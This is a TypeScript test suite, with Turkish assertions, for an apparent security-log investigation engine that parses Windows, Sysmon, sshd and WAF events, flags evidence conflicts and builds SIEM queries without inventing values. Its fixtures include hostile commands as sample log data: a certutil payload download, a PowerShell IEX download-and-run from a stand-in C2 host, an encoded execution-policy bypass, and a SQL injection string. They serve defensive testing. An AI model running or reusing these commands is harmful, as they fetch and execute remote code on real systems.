/**
 * ============================================================================
 * SCREENSHOT FORENSIC ADVERSARIAL & L2 INVESTIGATION VERIFICATION TEST SUITE
 * ============================================================================
 *
 * Core Forensic Invariant:
 * OBSERVED ≠ INTERPRETATION ≠ HYPOTHESIS ≠ CONFIRMED INCIDENT
 *
 * 1. Screenshot Forensic Evidence Extraction:
 *    - Windows Event Viewer 4625 & 4688
 *    - Sysmon Event 1 & PowerShell 4104
 *    - Splunk / Sentinel / Elastic screens
 *    - F5 / FortiGate / WAF screens
 *    - Linux sshd auth.log
 *    - Low-res / cropped / blurred handling (MISSING, UNCERTAIN_FROM_IMAGE, OUT_OF_FRAME)
 *    - Strict non-hallucination of unobserved IPs, usernames, Event IDs, ports, hosts
 *
 * 2. Screenshot + Text Conflict Detection:
 *    - Distinct user/IP values produce SOURCE CONFLICT, preserved separately
 *
 * 3. Query Field Provenance:
 *    - Classification into OBSERVED, DERIVED, PLACEHOLDER, STATIC_QUERY_SYNTAX
 *    - No unobserved IP filter injection
 *
 * 4. SIEM Query Correctness:
 *    - Valid Splunk, KQL, Elastic, QRadar syntax & schema independence caveats
 */

import { generateL2InvestigationPlan } from '../services/l2InvestigationEngine';
import {
  detectEvidenceConflict,
  ObservedFromImage,
} from '../services/imageForensicService';

let passCount = 0;
let failCount = 0;

function assert(condition: boolean, message: string) {
  if (!condition) {
    console.error(`❌ [FAIL] ${message}`);
    failCount++;
    throw new Error(`Test assertion failed: ${message}`);
  }
  passCount++;
  console.log(`✅ [PASS] ${message}`);
}

function runTest(name: string, fn: () => void) {
  console.log(`\n--- ${name} ---`);
  try {
    fn();
  } catch (err: any) {
    console.error(`Test failed in "${name}":`, err.message);
    process.exit(1);
  }
}

console.log('\n================================================================');
console.log('🛡️ RUNNING SCREENSHOT FORENSIC ADVERSARIAL VERIFICATION TESTS');
console.log('================================================================\n');

// =============================================================================
// TEST SUITE 1: SCREENSHOT FORENSIC EXTRACTION & EVIDENCE PROVENANCE
// =============================================================================

runTest('1.A: Windows Event Viewer 4625 Gözlenen Alanlar ve Sıfır Halüsinasyon', () => {
  const rawLog = `EventID: 4625
Provider: Microsoft-Windows-Security-Auditing
TimeCreated: 2026-10-06T14:20:00Z
TargetUserName: admin_corp
WorkstationName: PC-REMOTE-09
Computer: SRV-DC01.corp.local
LogonType: 10
Status: 0xC000006D
SubStatus: 0xC000006A
SourceNetworkAddress: 194.26.29.112
SourcePort: 49812`;

  const plan = generateL2InvestigationPlan(rawLog);

  assert(plan.classification.keyFields['Event ID'] === '4625', 'Event ID 4625 olmalı');
  assert(plan.classification.keyFields['Kullanıcı'] === 'admin_corp', 'Kullanıcı admin_corp olmalı');
  assert(plan.classification.keyFields['Kaynak IP'] === '194.26.29.112', 'Kaynak IP 194.26.29.112 olmalı');
  assert(plan.classification.keyFields['Logon Type'].includes('10'), 'Logon Type 10 olmalı');
  assert(plan.classification.keyFields['SubStatus'].toUpperCase().includes('0XC000006A'), 'SubStatus 0xC000006A olmalı');

  // Query provenance check
  const prov = plan.queryFieldProvenance || [];
  const ipProv = prov.find((p) => p.field.includes('src_ip'));
  assert(ipProv?.classification === 'OBSERVED', 'Kaynak IP OBSERVED sınıfında olmalı');
  assert(ipProv?.value === '194.26.29.112', 'Kaynak IP değeri 194.26.29.112 olmalı');
});

runTest('1.B: Windows Event Viewer 4688 Process Creation & LOLBAS Doğrulaması', () => {
  const rawLog = `EventID: 4688
NewProcessName: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
ProcessCommandLine: powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgA...
ParentProcessName: C:\\Windows\\System32\\cmd.exe
SubjectUserName: SYSTEM
Computer: SRV-FIN-DC01.corp.local`;

  const plan = generateL2InvestigationPlan(rawLog);

  assert(plan.classification.keyFields['Event ID'] === '4688', 'Event ID 4688 olmalı');
  assert(plan.classification.keyFields['Süreç'].includes('powershell.exe'), 'Süreç powershell.exe olmalı');
  assert(plan.classification.keyFields['Komut Satırı'].includes('-ExecutionPolicy Bypass'), 'Komut satırı Bypass içermeli');
  assert(plan.classification.keyFields['Üst Süreç'].includes('cmd.exe'), 'Üst süreç cmd.exe olmalı');

  // Verify that since source IP is absent, no IP is hallucinated
  const prov = plan.queryFieldProvenance || [];
  const ipProv = prov.find((p) => p.field.includes('src_ip'));
  assert(ipProv?.classification === 'PLACEHOLDER', 'Eksik IP PLACEHOLDER veya UYGULANMAZ olmalı');
  assert(!plan.queries.splunk.includes('src_ip="10.'), 'Splunk sorgusunda uydurma IP yer almamalı');
  assert(!plan.queries.kql.includes('IpAddress == "10.'), 'KQL sorgusunda uydurma IP yer almamalı');
});

runTest('1.C: Sysmon Event 1 (Process Create) Ayrıştırma', () => {
  const rawLog = `EventID: 1
Provider: Microsoft-Windows-Sysmon
Image: C:\\Windows\\System32\\certutil.exe
CommandLine: certutil.exe -urlcache -split -f http://malicious.corp/payload.exe C:\\temp\\p.exe
ParentImage: C:\\Windows\\System32\\cmd.exe
User: NT AUTHORITY\\SYSTEM
Computer: WORKSTATION-77`;

  const plan = generateL2InvestigationPlan(rawLog);

  assert(plan.classification.platform === 'Windows', 'Sysmon platformu Windows olmalı');
  assert(plan.classification.keyFields['Süreç'].includes('certutil.exe'), 'Süreç certutil.exe olmalı');
  assert(plan.classification.keyFields['Komut Satırı'].includes('certutil.exe'), 'Komut satırı certutil içermeli');
});

runTest('1.D: PowerShell Script Block (Event 4104) ve Kod Yürütme', () => {
  const rawLog = `EventID: 4104
Provider: Microsoft-Windows-PowerShell
ScriptBlockText: IEX (New-Object Net.WebClient).DownloadString('http://c2.local/run.ps1')
Computer: DESKTOP-DEV01`;

  const plan = generateL2InvestigationPlan(rawLog);

  assert(plan.classification.platform === 'Windows', 'PowerShell platformu Windows olmalı');
  assert(plan.classification.observedBehavior.length > 10, 'Gözlenen davranış açıklaması oluşturulmalı');
});

runTest('1.E: Linux Syslog / SSHd Auth Log Ayrıştırma', () => {
  const rawLog = `Mar 15 11:42:01 edge-srv sshd[9182]: Failed password for invalid user oracle from 203.0.113.88 port 51234 ssh2`;

  const plan = generateL2InvestigationPlan(rawLog);

  assert(plan.classification.platform === 'Linux', 'Platform Linux olmalı');
  assert(plan.classification.keyFields['Kullanıcı'] === 'oracle', 'Kullanıcı oracle olmalı');
  assert(plan.classification.keyFields['Kaynak IP'] === '203.0.113.88', 'Kaynak IP 203.0.113.88 olmalı');
  assert(plan.queries.splunk.includes('203.0.113.88'), 'Splunk sorgusu gerçek kaynak IP içermeli');
});

runTest('1.F: WAF / FortiWeb Exploit Logu & Action Ayrıştırma', () => {
  const rawLog = `action="alert" msg="SQL Injection Attack detected" src=198.51.100.22 dst=10.0.1.5 hostname="api.corp.com" url="/login.php?user=admin' OR '1'='1"`;

  const plan = generateL2InvestigationPlan(rawLog);

  assert(plan.classification.platform === 'Web / Network', 'Platform Web / Network olmalı');
  assert(plan.classification.keyFields['Kaynak IP'] === '198.51.100.22', 'Kaynak IP doğru ayrıştırılmalı');
  assert(plan.classification.keyFields['WAF Aksiyonu'] === 'ALERT / ALLOW', 'Aksiyon ALERT olmalı');
  assert(plan.hypotheses.some((h) => h.likelihood === 'YÜKSEK'), 'WAF engellemediği için alert olasılığı YÜKSEK olmalı');
});

runTest('1.G: Düşük Çözünürlüklü / Eksik Telemetri ve Sıfır Halüsinasyon İlkesi', () => {
  const rawLog = `SOME_BLURRED_LOG_ENTRY: status=error timestamp=unknown`;

  const plan = generateL2InvestigationPlan(rawLog);

  assert(plan.classification.logSource === 'Log kaynağı kesin belirlenemedi.', 'Kaynak kesin belirlenemediği açıkça söylenmeli');
  assert(plan.classification.confidence === 'BELİRSİZ', 'Güven derecesi BELİRSİZ olmalı');
  assert(!plan.queries.splunk.includes('192.168.'), 'Eksik logda sahte IP uydurulmamalı');
  assert(!plan.queries.splunk.includes('admin'), 'Eksik logda sahte kullanıcı adı uydurulmamalı');
});

// =============================================================================
// TEST SUITE 2: SCREENSHOT + TEXT CONFLICT DETECTION TEST
// =============================================================================

runTest('2.1: Screenshot ile Text çeliştiğinde sessizce birleştirilmemeli ve SOURCE CONFLICT üretilmeli', () => {
  const screenshotEvidence: ObservedFromImage = {
    eventId: '4625',
    provider: 'Microsoft-Windows-Security-Auditing',
    timestamp: '2026-10-06 12:00:00',
    host: 'DC01.corp.local',
    username: 'admin',
    sourceIp: '10.10.10.10',
    destinationIp: null,
    port: null,
    processName: null,
    parentProcess: null,
    commandLine: null,
    action: null,
    status: '0xC000006A',
    rawMessage: 'Failed logon',
  };

  const supplementalText = `EventID=4625 User=administrator SourceIP=10.10.10.20 Host=DC02.corp.local`;

  const conflict = detectEvidenceConflict(screenshotEvidence, supplementalText);

  assert(conflict !== null, 'Çelişki tespit edilmeli');
  assert(conflict!.hasConflict === true, 'hasConflict true olmalı');
  assert(conflict!.conflicts.length >= 2, 'En az 2 çelişki alanı bulunmalı (User ve IP)');

  const userConflict = conflict!.conflicts.find((c) => c.field.includes('Kullanıcı'));
  assert(userConflict?.screenshotValue === 'admin', 'Görüntüdeki kullanıcı admin');
  assert(userConflict?.textValue === 'administrator', 'Metindeki kullanıcı administrator');

  const ipConflict = conflict!.conflicts.find((c) => c.field.includes('Kaynak IP'));
  assert(ipConflict?.screenshotValue === '10.10.10.10', 'Görüntüdeki IP 10.10.10.10');
  assert(ipConflict?.textValue === '10.10.10.20', 'Metindeki IP 10.10.10.20');

  assert(conflict!.nextVerification.length > 0, 'Analist için doğrulama adımları sunulmalı');
});

runTest('2.2: Screenshot ve Text tamamen örtüştüğünde çelişki üretilmemeli', () => {
  const screenshotEvidence: ObservedFromImage = {
    eventId: '4625',
    provider: 'Microsoft-Windows-Security-Auditing',
    timestamp: '2026-10-06 12:00:00',
    host: 'DC01.corp.local',
    username: 'tekin.yilmaz',
    sourceIp: '10.20.30.40',
    destinationIp: null,
    port: null,
    processName: null,
    parentProcess: null,
    commandLine: null,
    action: null,
    status: '0xC000006A',
    rawMessage: 'Failed logon',
  };

  const supplementalText = `User=tekin.yilmaz SourceIP=10.20.30.40 Host=DC01.corp.local`;

  const conflict = detectEvidenceConflict(screenshotEvidence, supplementalText);
  assert(conflict === null, 'Aynı alanlar için çelişki üretilmemeli');
});

// =============================================================================
// TEST SUITE 3: QUERY PROVENANCE TEST (OBSERVED / DERIVED / PLACEHOLDER)
// =============================================================================

runTest('3.1: Logda Kaynak IP yokken sorgulara sahte IP eklenmemeli ve PLACEHOLDER olarak işaretlenmeli', () => {
  const rawLog = `EventID=4625 TargetUserName="fatma.kaya" WorkstationName="PC-IK-02" SubStatus="0xC000006A" LogonType=2`;
  const plan = generateL2InvestigationPlan(rawLog);

  const prov = plan.queryFieldProvenance || [];
  const ipField = prov.find((p) => p.field.includes('src_ip'));
  assert(ipField !== undefined, 'src_ip parametre listesinde bulunmalı');
  assert(ipField!.classification === 'PLACEHOLDER', 'Eksik IP PLACEHOLDER olarak sınıflandırılmalı');

  // Verify that neither Splunk, KQL, Elastic nor QRadar includes an invented IP like 10.20.5.41
  assert(!plan.queries.splunk.includes('src_ip="10.20.5.41"'), 'Uydurma IP Splunk sorgusuna girmemeli');
  assert(!plan.queries.kql.includes('10.20.5.41'), 'Uydurma IP KQL sorgusuna girmemeli');
  assert(!plan.queries.elastic.includes('10.20.5.41'), 'Uydurma IP Elastic sorgusuna girmemeli');
  assert(!plan.queries.qradarAql.includes('10.20.5.41'), 'Uydurma IP QRadar sorgusuna girmemeli');
});

runTest('3.2: Logda Kullanıcı ve Host varken OBSERVED olarak işaretlenmeli ve sorgulara aktarılmalı', () => {
  const rawLog = `EventID=4625 TargetUserName="mehmet.oz" WorkstationName="PC-MUH-05" Computer="DC-PRIMARY" LogonType=3`;
  const plan = generateL2InvestigationPlan(rawLog);

  const prov = plan.queryFieldProvenance || [];
  const userField = prov.find((p) => p.field.includes('user'));
  assert(userField?.classification === 'OBSERVED', 'Kullanıcı OBSERVED olmalı');
  assert(userField?.value === 'mehmet.oz', 'Kullanıcı mehmet.oz olmalı');

  assert(plan.queries.splunk.includes('mehmet.oz'), 'Splunk sorgusunda gerçek kullanıcı adı bulunmalı');
  assert(plan.queries.kql.includes('mehmet.oz'), 'KQL sorgusunda gerçek kullanıcı adı bulunmalı');
});

// =============================================================================
// TEST SUITE 4: SIEM QUERY CORRECTNESS & DATA MODEL ADAPTABILITY
// =============================================================================

runTest('4.1: Üretilen SIEM sorgularında veri modeli uyarı notu yer almalı', () => {
  const rawLog = `EventID=4688 NewProcessName="whoami.exe" ProcessCommandLine="whoami /all" Computer="PC-01"`;
  const plan = generateL2InvestigationPlan(rawLog);

  // Markdown check
  assert(
    plan.summaryMarkdown.includes('Alan adları kurumunuzun SIEM veri modeline (CIM / ASIM / ECS / QRadar DSM) göre uyarlanmalıdır'),
    'Markdown çıktısında veri modeli uyarı notu bulunmalı'
  );

  // Splunk SPL syntax check
  assert(plan.queries.splunk.includes('table _time'), 'Splunk geçerli tablo projeksiyonu içermeli');

  // KQL syntax check
  assert(plan.queries.kql.includes('project TimeGenerated'), 'KQL geçerli project ifadesi içermeli');

  // Elastic syntax check
  assert(plan.queries.elastic.includes('winlog.event_id'), 'Elastic geçerli ECS alanı içermeli');

  // QRadar AQL syntax check
  assert(plan.queries.qradarAql.includes('SELECT') && plan.queries.qradarAql.includes('FROM events'), 'QRadar geçerli AQL SELECT içermeli');
});

// =============================================================================
// TEST SUITE 5: SAFE CONTAINMENT GUIDANCE & OPERATIONAL SAFETY
// =============================================================================

runTest('5.1: Containment önerileri körü körüne yıkıcı olmamalı; WHY, WHEN, RISK ve EVIDENCE sunulmalı', () => {
  const rawLog = `EventID=4625 TargetUserName="admin" WorkstationName="PC-01" SourceNetworkAddress=10.0.0.99`;
  const plan = generateL2InvestigationPlan(rawLog);

  const steps = plan.safeContainmentSteps || [];
  assert(steps.length >= 2, 'En az 2 güvenli müdahale adımı bulunmalı');

  const hostStep = steps.find((s) => s.action.includes('İzolasyonu'));
  assert(hostStep !== undefined, 'Host izolasyonu adımı bulunmalı');
  assert(hostStep!.isDestructiveOrImpacting === true, 'Host izolasyonu servis kesintisi riski olarak işaretlenmeli');
  assert(hostStep!.risk.length > 5, 'İş sürekliliği riski açıklanmış olmalı');
  assert(hostStep!.evidenceRequired.length > 5, 'Gerekli adli kanıt belirtilmiş olmalı');
});

console.log('\n================================================================');
console.log(`🎉 TÜM ADVERSARIAL FORENSIC DOĞRULAMA TESTLERİ BAŞARIYLA GEÇTİ: ${passCount} / ${passCount}`);
console.log('================================================================\n');
